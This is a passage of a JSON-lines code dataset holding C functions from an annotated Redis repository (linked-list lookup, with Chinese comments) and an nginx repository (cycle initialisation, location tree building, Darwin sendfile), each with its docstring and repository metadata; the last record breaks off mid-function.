{"docstring": "// \u6839\u636e\u4e0b\u6807\u7d22\u5f15\u67e5\u627elist\n", "func_signal": "listNode *listIndex(list *list, long index)", "code": "{\n    listNode *n;\n\n    // redis\u5728\u8fd9\u70b9\u4e0a\u652f\u6301\u6b63\u5411\u4e0b\u6807\u548c\u53cd\u5411\u4e0b\u6807\uff0c\u8fd9\u70b9\u4ece\u5176\u547d\u4ee4\u64cd\u4f5c\u5c31\u53ef\u4ee5\u77e5\u9053\n    if (index < 0) {\n        // \u5982\u679cindex\u4e3a\u8d1f\u6570\uff0c\u5219\u4ece\u540e\u5f80\u524d\u6570\uff0c\u6700\u540e\u4e00\u4e2a\u8282\u70b9\u7684\u4e0b\u6807\u4e3a-1\n        index = (-index)-1;\n        n = list->tail;\n        while(index-- && n) n = n->prev;\n    } else {\n        // \u5982\u679cindex\u4e3a\u6b63\u6570\u6570\uff0c\u5219\u4ece\u524d\u5f80\u540e\u6570\uff0c\u7b2c\u4e00\u4e2a\u8282\u70b9\u7684\u4e0b\u6807\u4e3a0\n        n = list->head;\n        while(index-- && n) n = n->next;\n    }\n    return n;\n}", "path": "adlist.c", "repo_name": "xiejingfa/the-annotated-redis-3.0", "stars": 92, "license": "None", "language": "c", "size": 263}
{"docstring": "// \u6839\u636e\u5173\u952e\u5b57\u67e5\u627elist\n", "func_signal": "listNode *listSearchKey(list *list, void *key)", "code": "{\n    listIter *iter; // \u94fe\u8868\u8fed\u4ee3\u5668\n    listNode *node; // \u94fe\u8868\u8282\u70b9\n\n    // \u83b7\u53d6\u4ece\u524d\u5f80\u540e\u7684\u8fed\u4ee3\u5668\uff0c\u9700\u8981\u624b\u52a8\u91ca\u653e\n    iter = listGetIterator(list, AL_START_HEAD);\n    while((node = listNext(iter)) != NULL) {\n        // \u4ece\u524d\u5f80\u540e\u904d\u5386\u904d\u5386\u94fe\u8868\uff0c\u76f4\u5230\u627e\u5230\u76ee\u6807\u8282\u70b9\n        if (list->match) {\n            // \u5982\u679c\u94fe\u8868list\u8bbe\u7f6e\u4e86match\u51fd\u6570\uff0c\u5219\u7528match\u51fd\u6570\u5224\u65ad\u5f53\u524d\u8282\u70b9\u662f\u5426\u548c\u7ed9\u70b9\u8282\u70b9\u76f8\u540c\n            if (list->match(node->value, key)) {\n                listReleaseIterator(iter);  // \u91ca\u653e\u8fed\u4ee3\u5668\n                return node;\n            }\n        } else {\n            // \u5982\u679c\u94fe\u8868list\u6ca1\u6709\u8bbe\u7f6e\u4e86match\u51fd\u6570\uff0c\u5219\u6bd4\u8f83\u6307\u9488\u662f\u5426\u76f8\u7b49\n            if (key == node->value) {\n                listReleaseIterator(iter);  // // \u91ca\u653e\u8fed\u4ee3\u5668\n                return node;\n            }\n        }\n    }\n    listReleaseIterator(iter);  // \u91ca\u653e\u8fed\u4ee3\u5668\n    return NULL;\n}", "path": "adlist.c", "repo_name": "xiejingfa/the-annotated-redis-3.0", "stars": 92, "license": "None", "language": "c", "size": 263}
{"docstring": "/* STUB */\n", "func_signal": "ngx_cycle_t *\nngx_init_cycle(ngx_cycle_t *old_cycle)", "code": "{\n    void                *rv;\n    char               **senv, **env;\n    ngx_uint_t           i, n;\n    ngx_log_t           *log;\n    ngx_time_t          *tp;\n    ngx_conf_t           conf;\n    ngx_pool_t          *pool;\n    ngx_cycle_t         *cycle, **old;\n    ngx_shm_zone_t      *shm_zone, *oshm_zone;\n    ngx_list_part_t     *part, *opart;\n    ngx_open_file_t     *file;\n    ngx_listening_t     *ls, *nls;\n    ngx_core_conf_t     *ccf, *old_ccf;\n    ngx_core_module_t   *module;\n    char                 hostname[NGX_MAXHOSTNAMELEN];\n\n    ngx_timezone_update();\n\n    /* force localtime update with a new timezone */\n\n    tp = ngx_timeofday();\n    tp->sec = 0;\n\n    ngx_time_update();\n\n\n    log = old_cycle->log;\n\n    pool = ngx_create_pool(NGX_CYCLE_POOL_SIZE, log);\n    if (pool == NULL) {\n        return NULL;\n    }\n    pool->log = log;\n\n    cycle = ngx_pcalloc(pool, sizeof(ngx_cycle_t));\n    if (cycle == NULL) {\n        ngx_destroy_pool(pool);\n        return NULL;\n    }\n\n    cycle->pool = pool;\n    cycle->log = log;\n    cycle->old_cycle = old_cycle;\n\n    cycle->conf_prefix.len = old_cycle->conf_prefix.len;\n    cycle->conf_prefix.data = ngx_pstrdup(pool, &old_cycle->conf_prefix);\n    if (cycle->conf_prefix.data == NULL) {\n        ngx_destroy_pool(pool);\n        return NULL;\n    }\n\n    cycle->prefix.len = old_cycle->prefix.len;\n    cycle->prefix.data = ngx_pstrdup(pool, &old_cycle->prefix);\n    if (cycle->prefix.data == NULL) {\n        ngx_destroy_pool(pool);\n        return NULL;\n    }\n\n    cycle->conf_file.len = old_cycle->conf_file.len;\n    cycle->conf_file.data = ngx_pnalloc(pool, old_cycle->conf_file.len + 1);\n    if (cycle->conf_file.data == NULL) {\n        ngx_destroy_pool(pool);\n        return NULL;\n    }\n    ngx_cpystrn(cycle->conf_file.data, old_cycle->conf_file.data,\n                old_cycle->conf_file.len + 1);\n\n    cycle->conf_param.len = old_cycle->conf_param.len;\n    cycle->conf_param.data = ngx_pstrdup(pool, &old_cycle->conf_param);\n    if (cycle->conf_param.data == NULL) {\n        ngx_destroy_pool(pool);\n        return NULL;\n    }\n\n\n    n = old_cycle->paths.nelts ? old_cycle->paths.nelts : 10;\n\n    cycle->paths.elts = ngx_pcalloc(pool, n * sizeof(ngx_path_t *));\n    if (cycle->paths.elts == NULL) {\n        ngx_destroy_pool(pool);\n        return NULL;\n    }\n\n    cycle->paths.nelts = 0;\n    cycle->paths.size = sizeof(ngx_path_t *);\n    cycle->paths.nalloc = n;\n    cycle->paths.pool = pool;\n\n\n    if (ngx_array_init(&cycle->config_dump, pool, 1, sizeof(ngx_conf_dump_t))\n        != NGX_OK)\n    {\n        ngx_destroy_pool(pool);\n        return NULL;\n    }\n\n    if (old_cycle->open_files.part.nelts) {\n        n = old_cycle->open_files.part.nelts;\n        for (part = old_cycle->open_files.part.next; part; part = part->next) {\n            n += part->nelts;\n        }\n\n    } else {\n        n = 20;\n    }\n\n    if (ngx_list_init(&cycle->open_files, pool, n, sizeof(ngx_open_file_t))\n        != NGX_OK)\n    {\n        ngx_destroy_pool(pool);\n        return NULL;\n    }\n\n\n    if (old_cycle->shared_memory.part.nelts) {\n        n = old_cycle->shared_memory.part.nelts;\n        for (part = old_cycle->shared_memory.part.next; part; part = part->next)\n        {\n            n += part->nelts;\n        }\n\n    } else {\n        n = 1;\n    }\n\n    if (ngx_list_init(&cycle->shared_memory, pool, n, sizeof(ngx_shm_zone_t))\n        != NGX_OK)\n    {\n        ngx_destroy_pool(pool);\n        return NULL;\n    }\n\n    n = old_cycle->listening.nelts ? old_cycle->listening.nelts : 10;\n\n    cycle->listening.elts = ngx_pcalloc(pool, n * sizeof(ngx_listening_t));\n    if (cycle->listening.elts == NULL) {\n        ngx_destroy_pool(pool);\n        return NULL;\n    }\n\n    cycle->listening.nelts = 0;\n    cycle->listening.size = sizeof(ngx_listening_t);\n    cycle->listening.nalloc = n;\n    cycle->listening.pool = pool;\n\n\n    ngx_queue_init(&cycle->reusable_connections_queue);\n\n\n    cycle->conf_ctx = ngx_pcalloc(pool, ngx_max_module * sizeof(void *));\n    if (cycle->conf_ctx == NULL) {\n        ngx_destroy_pool(pool);\n        return NULL;\n    }\n\n\n    if (gethostname(hostname, NGX_MAXHOSTNAMELEN) == -1) {\n        ngx_log_error(NGX_LOG_EMERG, log, ngx_errno, \"gethostname() failed\");\n        ngx_destroy_pool(pool);\n        return NULL;\n    }\n\n    /* on Linux gethostname() silently truncates name that does not fit */\n\n    hostname[NGX_MAXHOSTNAMELEN - 1] = '\\0';\n    cycle->hostname.len = ngx_strlen(hostname);\n\n    cycle->hostname.data = ngx_pnalloc(pool, cycle->hostname.len);\n    if (cycle->hostname.data == NULL) {\n        ngx_destroy_pool(pool);\n        return NULL;\n    }\n\n    ngx_strlow(cycle->hostname.data, (u_char *) hostname, cycle->hostname.len);\n\n\n    if (ngx_cycle_modules(cycle) != NGX_OK) {\n        ngx_destroy_pool(pool);\n        return NULL;\n    }\n\n\n    for (i = 0; cycle->modules[i]; i++) {\n        if (cycle->modules[i]->type != NGX_CORE_MODULE) {\n            continue;\n        }\n\n        module = cycle->modules[i]->ctx;\n\n        if (module->create_conf) {\n            rv = module->create_conf(cycle);\n            if (rv == NULL) {\n                ngx_destroy_pool(pool);\n                return NULL;\n            }\n            cycle->conf_ctx[cycle->modules[i]->index] = rv;\n        }\n    }\n\n\n    senv = environ;\n\n\n    ngx_memzero(&conf, sizeof(ngx_conf_t));\n    /* STUB: init array ? */\n    conf.args = ngx_array_create(pool, 10, sizeof(ngx_str_t));\n    if (conf.args == NULL) {\n        ngx_destroy_pool(pool);\n        return NULL;\n    }\n\n    conf.temp_pool = ngx_create_pool(NGX_CYCLE_POOL_SIZE, log);\n    if (conf.temp_pool == NULL) {\n        ngx_destroy_pool(pool);\n        return NULL;\n    }\n\n\n    conf.ctx = cycle->conf_ctx;\n    conf.cycle = cycle;\n    conf.pool = pool;\n    conf.log = log;\n    conf.module_type = NGX_CORE_MODULE;\n    conf.cmd_type = NGX_MAIN_CONF;\n\n#if 0\n    log->log_level = NGX_LOG_DEBUG_ALL;\n#endif\n\n    if (ngx_conf_param(&conf) != NGX_CONF_OK) {\n        environ = senv;\n        ngx_destroy_cycle_pools(&conf);\n        return NULL;\n    }\n\n    if (ngx_conf_parse(&conf, &cycle->conf_file) != NGX_CONF_OK) {\n        environ = senv;\n        ngx_destroy_cycle_pools(&conf);\n        return NULL;\n    }\n\n    if (ngx_test_config && !ngx_quiet_mode) {\n        ngx_log_stderr(0, \"the configuration file %s syntax is ok\",\n                       cycle->conf_file.data);\n    }\n\n    for (i = 0; cycle->modules[i]; i++) {\n        if (cycle->modules[i]->type != NGX_CORE_MODULE) {\n            continue;\n        }\n\n        module = cycle->modules[i]->ctx;\n\n        if (module->init_conf) {\n            if (module->init_conf(cycle,\n                                  cycle->conf_ctx[cycle->modules[i]->index])\n                == NGX_CONF_ERROR)\n            {\n                environ = senv;\n                ngx_destroy_cycle_pools(&conf);\n                return NULL;\n            }\n        }\n    }\n\n    if (ngx_process == NGX_PROCESS_SIGNALLER) {\n        return cycle;\n    }\n\n    ccf = (ngx_core_conf_t *) ngx_get_conf(cycle->conf_ctx, ngx_core_module);\n\n    if (ngx_test_config) {\n\n        if (ngx_create_pidfile(&ccf->pid, log) != NGX_OK) {\n            goto failed;\n        }\n\n    } else if (!ngx_is_init_cycle(old_cycle)) {\n\n        /*\n         * we do not create the pid file in the first ngx_init_cycle() call\n         * because we need to write the demonized process pid\n         */\n\n        old_ccf = (ngx_core_conf_t *) ngx_get_conf(old_cycle->conf_ctx,\n                                                   ngx_core_module);\n        if (ccf->pid.len != old_ccf->pid.len\n            || ngx_strcmp(ccf->pid.data, old_ccf->pid.data) != 0)\n        {\n            /* new pid file name */\n\n            if (ngx_create_pidfile(&ccf->pid, log) != NGX_OK) {\n                goto failed;\n            }\n\n            ngx_delete_pidfile(old_cycle);\n        }\n    }\n\n\n    if (ngx_test_lockfile(cycle->lock_file.data, log) != NGX_OK) {\n        goto failed;\n    }\n\n\n    if (ngx_create_paths(cycle, ccf->user) != NGX_OK) {\n        goto failed;\n    }\n\n\n    if (ngx_log_open_default(cycle) != NGX_OK) {\n        goto failed;\n    }\n\n    /* open the new files */\n\n    part = &cycle->open_files.part;\n    file = part->elts;\n\n    for (i = 0; /* void */ ; i++) {\n\n        if (i >= part->nelts) {\n            if (part->next == NULL) {\n                break;\n            }\n            part = part->next;\n            file = part->elts;\n            i = 0;\n        }\n\n        if (file[i].name.len == 0) {\n            continue;\n        }\n\n        file[i].fd = ngx_open_file(file[i].name.data,\n                                   NGX_FILE_APPEND,\n                                   NGX_FILE_CREATE_OR_OPEN,\n                                   NGX_FILE_DEFAULT_ACCESS);\n\n        ngx_log_debug3(NGX_LOG_DEBUG_CORE, log, 0,\n                       \"log: %p %d \\\"%s\\\"\",\n                       &file[i], file[i].fd, file[i].name.data);\n\n        if (file[i].fd == NGX_INVALID_FILE) {\n            ngx_log_error(NGX_LOG_EMERG, log, ngx_errno,\n                          ngx_open_file_n \" \\\"%s\\\" failed\",\n                          file[i].name.data);\n            goto failed;\n        }\n\n#if !(NGX_WIN32)\n        if (fcntl(file[i].fd, F_SETFD, FD_CLOEXEC) == -1) {\n            ngx_log_error(NGX_LOG_EMERG, log, ngx_errno,\n                          \"fcntl(FD_CLOEXEC) \\\"%s\\\" failed\",\n                          file[i].name.data);\n            goto failed;\n        }\n#endif\n    }\n\n    cycle->log = &cycle->new_log;\n    pool->log = &cycle->new_log;\n\n\n    /* create shared memory */\n\n    part = &cycle->shared_memory.part;\n    shm_zone = part->elts;\n\n    for (i = 0; /* void */ ; i++) {\n\n        if (i >= part->nelts) {\n            if (part->next == NULL) {\n                break;\n            }\n            part = part->next;\n            shm_zone = part->elts;\n            i = 0;\n        }\n\n        if (shm_zone[i].shm.size == 0) {\n            ngx_log_error(NGX_LOG_EMERG, log, 0,\n                          \"zero size shared memory zone \\\"%V\\\"\",\n                          &shm_zone[i].shm.name);\n            goto failed;\n        }\n\n        shm_zone[i].shm.log = cycle->log;\n\n        opart = &old_cycle->shared_memory.part;\n        oshm_zone = opart->elts;\n\n        for (n = 0; /* void */ ; n++) {\n\n            if (n >= opart->nelts) {\n                if (opart->next == NULL) {\n                    break;\n                }\n                opart = opart->next;\n                oshm_zone = opart->elts;\n                n = 0;\n            }\n\n            if (shm_zone[i].shm.name.len != oshm_zone[n].shm.name.len) {\n                continue;\n            }\n\n            if (ngx_strncmp(shm_zone[i].shm.name.data,\n                            oshm_zone[n].shm.name.data,\n                            shm_zone[i].shm.name.len)\n                != 0)\n            {\n                continue;\n            }\n\n            if (shm_zone[i].tag == oshm_zone[n].tag\n                && shm_zone[i].shm.size == oshm_zone[n].shm.size\n                && !shm_zone[i].noreuse)\n            {\n                shm_zone[i].shm.addr = oshm_zone[n].shm.addr;\n#if (NGX_WIN32)\n                shm_zone[i].shm.handle = oshm_zone[n].shm.handle;\n#endif\n\n                if (shm_zone[i].init(&shm_zone[i], oshm_zone[n].data)\n                    != NGX_OK)\n                {\n                    goto failed;\n                }\n\n                goto shm_zone_found;\n            }\n\n            ngx_shm_free(&oshm_zone[n].shm);\n\n            break;\n        }\n\n        if (ngx_shm_alloc(&shm_zone[i].shm) != NGX_OK) {\n            goto failed;\n        }\n\n        if (ngx_init_zone_pool(cycle, &shm_zone[i]) != NGX_OK) {\n            goto failed;\n        }\n\n        if (shm_zone[i].init(&shm_zone[i], NULL) != NGX_OK) {\n            goto failed;\n        }\n\n    shm_zone_found:\n\n        continue;\n    }\n\n\n    /* handle the listening sockets */\n\n    if (old_cycle->listening.nelts) {\n        ls = old_cycle->listening.elts;\n        for (i = 0; i < old_cycle->listening.nelts; i++) {\n            ls[i].remain = 0;\n        }\n\n        nls = cycle->listening.elts;\n        for (n = 0; n < cycle->listening.nelts; n++) {\n\n            for (i = 0; i < old_cycle->listening.nelts; i++) {\n                if (ls[i].ignore) {\n                    continue;\n                }\n\n                if (ls[i].remain) {\n                    continue;\n                }\n\n                if (ls[i].type != nls[n].type) {\n                    continue;\n                }\n\n                if (ngx_cmp_sockaddr(nls[n].sockaddr, nls[n].socklen,\n                                     ls[i].sockaddr, ls[i].socklen, 1)\n                    == NGX_OK)\n                {\n                    nls[n].fd = ls[i].fd;\n                    nls[n].previous = &ls[i];\n                    ls[i].remain = 1;\n\n                    if (ls[i].backlog != nls[n].backlog) {\n                        nls[n].listen = 1;\n                    }\n\n#if (NGX_HAVE_DEFERRED_ACCEPT && defined SO_ACCEPTFILTER)\n\n                    /*\n                     * FreeBSD, except the most recent versions,\n                     * could not remove accept filter\n                     */\n                    nls[n].deferred_accept = ls[i].deferred_accept;\n\n                    if (ls[i].accept_filter && nls[n].accept_filter) {\n                        if (ngx_strcmp(ls[i].accept_filter,\n                                       nls[n].accept_filter)\n                            != 0)\n                        {\n                            nls[n].delete_deferred = 1;\n                            nls[n].add_deferred = 1;\n                        }\n\n                    } else if (ls[i].accept_filter) {\n                        nls[n].delete_deferred = 1;\n\n                    } else if (nls[n].accept_filter) {\n                        nls[n].add_deferred = 1;\n                    }\n#endif\n\n#if (NGX_HAVE_DEFERRED_ACCEPT && defined TCP_DEFER_ACCEPT)\n\n                    if (ls[i].deferred_accept && !nls[n].deferred_accept) {\n                        nls[n].delete_deferred = 1;\n\n                    } else if (ls[i].deferred_accept != nls[n].deferred_accept)\n                    {\n                        nls[n].add_deferred = 1;\n                    }\n#endif\n\n#if (NGX_HAVE_REUSEPORT)\n                    if (nls[n].reuseport && !ls[i].reuseport) {\n                        nls[n].add_reuseport = 1;\n                    }\n#endif\n\n                    break;\n                }\n            }\n\n            if (nls[n].fd == (ngx_socket_t) -1) {\n                nls[n].open = 1;\n#if (NGX_HAVE_DEFERRED_ACCEPT && defined SO_ACCEPTFILTER)\n                if (nls[n].accept_filter) {\n                    nls[n].add_deferred = 1;\n                }\n#endif\n#if (NGX_HAVE_DEFERRED_ACCEPT && defined TCP_DEFER_ACCEPT)\n                if (nls[n].deferred_accept) {\n                    nls[n].add_deferred = 1;\n                }\n#endif\n            }\n        }\n\n    } else {\n        ls = cycle->listening.elts;\n        for (i = 0; i < cycle->listening.nelts; i++) {\n            ls[i].open = 1;\n#if (NGX_HAVE_DEFERRED_ACCEPT && defined SO_ACCEPTFILTER)\n            if (ls[i].accept_filter) {\n                ls[i].add_deferred = 1;\n            }\n#endif\n#if (NGX_HAVE_DEFERRED_ACCEPT && defined TCP_DEFER_ACCEPT)\n            if (ls[i].deferred_accept) {\n                ls[i].add_deferred = 1;\n            }\n#endif\n        }\n    }\n\n    if (ngx_open_listening_sockets(cycle) != NGX_OK) {\n        goto failed;\n    }\n\n    if (!ngx_test_config) {\n        ngx_configure_listening_sockets(cycle);\n    }\n\n\n    /* commit the new cycle configuration */\n\n    if (!ngx_use_stderr) {\n        (void) ngx_log_redirect_stderr(cycle);\n    }\n\n    pool->log = cycle->log;\n\n    if (ngx_init_modules(cycle) != NGX_OK) {\n        /* fatal */\n        exit(1);\n    }\n\n\n    /* close and delete stuff that lefts from an old cycle */\n\n    /* free the unnecessary shared memory */\n\n    opart = &old_cycle->shared_memory.part;\n    oshm_zone = opart->elts;\n\n    for (i = 0; /* void */ ; i++) {\n\n        if (i >= opart->nelts) {\n            if (opart->next == NULL) {\n                goto old_shm_zone_done;\n            }\n            opart = opart->next;\n            oshm_zone = opart->elts;\n            i = 0;\n        }\n\n        part = &cycle->shared_memory.part;\n        shm_zone = part->elts;\n\n        for (n = 0; /* void */ ; n++) {\n\n            if (n >= part->nelts) {\n                if (part->next == NULL) {\n                    break;\n                }\n                part = part->next;\n                shm_zone = part->elts;\n                n = 0;\n            }\n\n            if (oshm_zone[i].shm.name.len == shm_zone[n].shm.name.len\n                && ngx_strncmp(oshm_zone[i].shm.name.data,\n                               shm_zone[n].shm.name.data,\n                               oshm_zone[i].shm.name.len)\n                == 0)\n            {\n                goto live_shm_zone;\n            }\n        }\n\n        ngx_shm_free(&oshm_zone[i].shm);\n\n    live_shm_zone:\n\n        continue;\n    }\n\nold_shm_zone_done:\n\n\n    /* close the unnecessary listening sockets */\n\n    ls = old_cycle->listening.elts;\n    for (i = 0; i < old_cycle->listening.nelts; i++) {\n\n        if (ls[i].remain || ls[i].fd == (ngx_socket_t) -1) {\n            continue;\n        }\n\n        if (ngx_close_socket(ls[i].fd) == -1) {\n            ngx_log_error(NGX_LOG_EMERG, log, ngx_socket_errno,\n                          ngx_close_socket_n \" listening socket on %V failed\",\n                          &ls[i].addr_text);\n        }\n\n#if (NGX_HAVE_UNIX_DOMAIN)\n\n        if (ls[i].sockaddr->sa_family == AF_UNIX) {\n            u_char  *name;\n\n            name = ls[i].addr_text.data + sizeof(\"unix:\") - 1;\n\n            ngx_log_error(NGX_LOG_WARN, cycle->log, 0,\n                          \"deleting socket %s\", name);\n\n            if (ngx_delete_file(name) == NGX_FILE_ERROR) {\n                ngx_log_error(NGX_LOG_EMERG, cycle->log, ngx_socket_errno,\n                              ngx_delete_file_n \" %s failed\", name);\n            }\n        }\n\n#endif\n    }\n\n\n    /* close the unnecessary open files */\n\n    part = &old_cycle->open_files.part;\n    file = part->elts;\n\n    for (i = 0; /* void */ ; i++) {\n\n        if (i >= part->nelts) {\n            if (part->next == NULL) {\n                break;\n            }\n            part = part->next;\n            file = part->elts;\n            i = 0;\n        }\n\n        if (file[i].fd == NGX_INVALID_FILE || file[i].fd == ngx_stderr) {\n            continue;\n        }\n\n        if (ngx_close_file(file[i].fd) == NGX_FILE_ERROR) {\n            ngx_log_error(NGX_LOG_EMERG, log, ngx_errno,\n                          ngx_close_file_n \" \\\"%s\\\" failed\",\n                          file[i].name.data);\n        }\n    }\n\n    ngx_destroy_pool(conf.temp_pool);\n\n    if (ngx_process == NGX_PROCESS_MASTER || ngx_is_init_cycle(old_cycle)) {\n\n        /*\n         * perl_destruct() frees environ, if it is not the same as it was at\n         * perl_construct() time, therefore we save the previous cycle\n         * environment before ngx_conf_parse() where it will be changed.\n         */\n\n        env = environ;\n        environ = senv;\n\n        ngx_destroy_pool(old_cycle->pool);\n        cycle->old_cycle = NULL;\n\n        environ = env;\n\n        return cycle;\n    }\n\n\n    if (ngx_temp_pool == NULL) {\n        ngx_temp_pool = ngx_create_pool(128, cycle->log);\n        if (ngx_temp_pool == NULL) {\n            ngx_log_error(NGX_LOG_EMERG, cycle->log, 0,\n                          \"could not create ngx_temp_pool\");\n            exit(1);\n        }\n\n        n = 10;\n        ngx_old_cycles.elts = ngx_pcalloc(ngx_temp_pool,\n                                          n * sizeof(ngx_cycle_t *));\n        if (ngx_old_cycles.elts == NULL) {\n            exit(1);\n        }\n        ngx_old_cycles.nelts = 0;\n        ngx_old_cycles.size = sizeof(ngx_cycle_t *);\n        ngx_old_cycles.nalloc = n;\n        ngx_old_cycles.pool = ngx_temp_pool;\n\n        ngx_cleaner_event.handler = ngx_clean_old_cycles;\n        ngx_cleaner_event.log = cycle->log;\n        ngx_cleaner_event.data = &dumb;\n        dumb.fd = (ngx_socket_t) -1;\n    }\n\n    ngx_temp_pool->log = cycle->log;\n\n    old = ngx_array_push(&ngx_old_cycles);\n    if (old == NULL) {\n        exit(1);\n    }\n    *old = old_cycle;\n\n    if (!ngx_cleaner_event.timer_set) {\n        ngx_add_timer(&ngx_cleaner_event, 30000);\n        ngx_cleaner_event.timer_set = 1;\n    }\n\n    return cycle;\n\n\nfailed:\n\n    if (!ngx_is_init_cycle(old_cycle)) {\n        old_ccf = (ngx_core_conf_t *) ngx_get_conf(old_cycle->conf_ctx,\n                                                   ngx_core_module);\n        if (old_ccf->environment) {\n            environ = old_ccf->environment;\n        }\n    }\n\n    /* rollback the new cycle configuration */\n\n    part = &cycle->open_files.part;\n    file = part->elts;\n\n    for (i = 0; /* void */ ; i++) {\n\n        if (i >= part->nelts) {\n            if (part->next == NULL) {\n                break;\n            }\n            part = part->next;\n            file = part->elts;\n            i = 0;\n        }\n\n        if (file[i].fd == NGX_INVALID_FILE || file[i].fd == ngx_stderr) {\n            continue;\n        }\n\n        if (ngx_close_file(file[i].fd) == NGX_FILE_ERROR) {\n            ngx_log_error(NGX_LOG_EMERG, log, ngx_errno,\n                          ngx_close_file_n \" \\\"%s\\\" failed\",\n                          file[i].name.data);\n        }\n    }\n\n    if (ngx_test_config) {\n        ngx_destroy_cycle_pools(&conf);\n        return NULL;\n    }\n\n    ls = cycle->listening.elts;\n    for (i = 0; i < cycle->listening.nelts; i++) {\n        if (ls[i].fd == (ngx_socket_t) -1 || !ls[i].open) {\n            continue;\n        }\n\n        if (ngx_close_socket(ls[i].fd) == -1) {\n            ngx_log_error(NGX_LOG_EMERG, log, ngx_socket_errno,\n                          ngx_close_socket_n \" %V failed\",\n                          &ls[i].addr_text);\n        }\n    }\n\n    ngx_destroy_cycle_pools(&conf);\n\n    return NULL;\n}", "path": "nginx\\core\\ngx_cycle.c", "repo_name": "purecpp-org/nginx_vs", "stars": 108, "license": "None", "language": "c", "size": 5273}
{"docstring": "/*\n * to keep cache locality for left leaf nodes, allocate nodes in following\n * order: node, left subtree, right subtree, inclusive subtree\n */\n", "func_signal": "static ngx_http_location_tree_node_t *\nngx_http_create_locations_tree(ngx_conf_t *cf, ngx_queue_t *locations,\n    size_t prefix)", "code": "{\n    size_t                          len;\n    ngx_queue_t                    *q, tail;\n    ngx_http_location_queue_t      *lq;\n    ngx_http_location_tree_node_t  *node;\n\n    q = ngx_queue_middle(locations);\n\n    lq = (ngx_http_location_queue_t *) q;\n    len = lq->name->len - prefix;\n\n    node = ngx_palloc(cf->pool,\n                      offsetof(ngx_http_location_tree_node_t, name) + len);\n    if (node == NULL) {\n        return NULL;\n    }\n\n    node->left = NULL;\n    node->right = NULL;\n    node->tree = NULL;\n    node->exact = lq->exact;\n    node->inclusive = lq->inclusive;\n\n    node->auto_redirect = (u_char) ((lq->exact && lq->exact->auto_redirect)\n                           || (lq->inclusive && lq->inclusive->auto_redirect));\n\n    node->len = (u_char) len;\n    ngx_memcpy(node->name, &lq->name->data[prefix], len);\n\n    ngx_queue_split(locations, q, &tail);\n\n    if (ngx_queue_empty(locations)) {\n        /*\n         * ngx_queue_split() insures that if left part is empty,\n         * then right one is empty too\n         */\n        goto inclusive;\n    }\n\n    node->left = ngx_http_create_locations_tree(cf, locations, prefix);\n    if (node->left == NULL) {\n        return NULL;\n    }\n\n    ngx_queue_remove(q);\n\n    if (ngx_queue_empty(&tail)) {\n        goto inclusive;\n    }\n\n    node->right = ngx_http_create_locations_tree(cf, &tail, prefix);\n    if (node->right == NULL) {\n        return NULL;\n    }\n\ninclusive:\n\n    if (ngx_queue_empty(&lq->list)) {\n        return node;\n    }\n\n    node->tree = ngx_http_create_locations_tree(cf, &lq->list, prefix + len);\n    if (node->tree == NULL) {\n        return NULL;\n    }\n\n    return node;\n}", "path": "nginx\\http\\ngx_http.c", "repo_name": "purecpp-org/nginx_vs", "stars": 108, "license": "None", "language": "c", "size": 5273}
{"docstring": "/*\n * It seems that Darwin 9.4 (Mac OS X 1.5) sendfile() has the same\n * old bug as early FreeBSD sendfile() syscall:\n * http://bugs.freebsd.org/33771\n *\n * Besides sendfile() has another bug: if one calls sendfile()\n * with both a header and a trailer, then sendfile() ignores a file part\n * at all and sends only the header and the trailer together.\n * For this reason we send a trailer only if there is no a header.\n *\n * Although sendfile() allows to pass a header or a trailer,\n * it may send the header or the trailer and a part of the file\n * in different packets.  And FreeBSD workaround (TCP_NOPUSH option)\n * does not help.\n */\n", "func_signal": "ngx_chain_t *\nngx_darwin_sendfile_chain(ngx_connection_t *c, ngx_chain_t *in, off_t limit)", "code": "{\n    int              rc;\n    off_t            send, prev_send, sent;\n    off_t            file_size;\n    ssize_t          n;\n    ngx_uint_t       eintr;\n    ngx_err_t        err;\n    ngx_buf_t       *file;\n    ngx_event_t     *wev;\n    ngx_chain_t     *cl;\n    ngx_iovec_t      header, trailer;\n    struct sf_hdtr   hdtr;\n    struct iovec     headers[NGX_IOVS_PREALLOCATE];\n    struct iovec     trailers[NGX_IOVS_PREALLOCATE];\n\n    wev = c->write;\n\n    if (!wev->ready) {\n        return in;\n    }\n\n#if (NGX_HAVE_KQUEUE)\n\n    if ((ngx_event_flags & NGX_USE_KQUEUE_EVENT) && wev->pending_eof) {\n        (void) ngx_connection_error(c, wev->kq_errno,\n                               \"kevent() reported about an closed connection\");\n        wev->error = 1;\n        return NGX_CHAIN_ERROR;\n    }\n\n#endif\n\n    /* the maximum limit size is the maximum size_t value - the page size */\n\n    if (limit == 0 || limit > (off_t) (NGX_MAX_SIZE_T_VALUE - ngx_pagesize)) {\n        limit = NGX_MAX_SIZE_T_VALUE - ngx_pagesize;\n    }\n\n    send = 0;\n\n    header.iovs = headers;\n    header.nalloc = NGX_IOVS_PREALLOCATE;\n\n    trailer.iovs = trailers;\n    trailer.nalloc = NGX_IOVS_PREALLOCATE;\n\n    for ( ;; ) {\n        eintr = 0;\n        prev_send = send;\n\n        /* create the header iovec and coalesce the neighbouring bufs */\n\n        cl = ngx_output_chain_to_iovec(&header, in, limit - send, c->log);\n\n        if (cl == NGX_CHAIN_ERROR) {\n            return NGX_CHAIN_ERROR;\n        }\n\n        send += header.size;\n\n        if (cl && cl->buf->in_file && send < limit) {\n            file = cl->buf;\n\n            /* coalesce the neighbouring file bufs */\n\n            file_size = ngx_chain_coalesce_file(&cl, limit - send);\n\n            send += file_size;\n\n            if (header.count == 0) {\n\n                /*\n                 * create the trailer iovec and coalesce the neighbouring bufs\n                 */\n\n                cl = ngx_output_chain_to_iovec(&trailer, cl, limit - send,\n                                               c->log);\n                if (cl == NGX_CHAIN_ERROR) {\n                    return NGX_CHAIN_ERROR;\n                }\n\n                send += trailer.size;\n\n            } else {\n                trailer.count = 0;\n            }\n\n            /*\n             * sendfile() returns EINVAL if sf_hdtr's count is 0,\n             * but corresponding pointer is not NULL\n             */\n\n            hdtr.headers = header.count ? header.iovs : NULL;\n            hdtr.hdr_cnt = header.count;\n            hdtr.trailers = trailer.count ? trailer.iovs : NULL;\n            hdtr.trl_cnt = trailer.count;\n\n            sent = header.size + file_size;\n\n            ngx_log_debug3(NGX_LOG_DEBUG_EVENT, c->log, 0,\n                           \"sendfile: @%O %O h:%uz\",\n                           file->file_pos, sent, header.size);\n\n            rc = sendfile(file->file->fd, c->fd, file->file_pos,\n                          &sent, &hdtr, 0);\n\n            if (rc == -1) {\n                err = ngx_errno;\n\n                switch (err) {\n                case NGX_EAGAIN:\n                    break;\n\n                